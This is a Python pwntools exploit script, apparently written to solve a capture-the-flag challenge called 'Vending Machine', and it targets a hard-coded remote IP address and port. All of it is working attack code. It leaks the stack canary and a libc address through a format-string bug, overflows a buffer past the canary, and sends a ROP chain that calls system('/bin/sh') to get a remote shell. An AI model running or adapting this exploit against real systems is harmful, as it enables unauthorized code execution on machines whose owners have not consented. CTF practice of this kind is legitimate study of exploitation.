#!/usr/bin/env python3
"""
Vending Machine PWN - 最终版
Target: 39.96.193.120:33334

漏洞利用:
1. 格式化字符串泄露 canary (%45$p) 和 libc (%10$s)
2. 栈溢出 512 字节绕过 qty 检查  
3. ROP 调用 system() 触发 shell

输出问题: 服务器配置导致 shell 输出未通过 socket 返回
"""
from pwn import *
import socket
import time

def exploit():
    context.log_level = 'info'
    io = remote('39.96.193.120', 33334, timeout=15)
    
    # Stage 1: Leak canary + libc
    io.recvuntil(b'ID:')
    io.send(b'%45$p%10$s' + b'A'*6 + p64(0x404028) + b'\n')
    io.recvuntil(b'Welcome, ')
    raw = io.recvuntil(b'quantity', drop=True)
    
    canary = int(raw[:18].decode(), 16)
    printf_addr = u64(raw[18:24].ljust(8, b'\x00'))
    libc = printf_addr - 0x61c90
    
    log.success(f'canary={hex(canary)}, libc={hex(libc)}')
    
    # Stage 2: Complete rounds
    io.send(b'1\n')
    io.recvuntil(b'product')
    io.send(b'a\n')
    io.recvuntil(b'Order confirmed!')
    
    io.recvuntil(b'ID:')
    io.send(b'B\n')
    io.recvuntil(b'quantity')
    io.send(b'1\n')
    io.recvuntil(b'product')
    io.send(b'b\n')
    io.recvuntil(b'Order confirmed!')
    
    # Stage 3: ROP exploit
    io.recvuntil(b'ID:')
    io.send(b'X'*30 + b'\n')
    io.recvuntil(b'quantity')
    
    system = libc + 0x52290
    binsh = libc + 0x1b45bd
    pop_rdi = libc + 0x23b6a
    
    # Build payload
    payload = b'512\n' + b'A'*264 + p64(canary) + b'B'*8
    payload += p64(pop_rdi) + p64(binsh) + p64(system)
    payload = payload.ljust(512, b'C')
    
    io.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    io.send(payload)
    
    io.recvuntil(b'Order confirmed!')
    log.success('Shell triggered!')
    
    # Try to get output
    time.sleep(2)
    out = io.recv()
    print(out.decode(errors='replace'))
    
    io.close()

if __name__ == '__main__':
    exploit()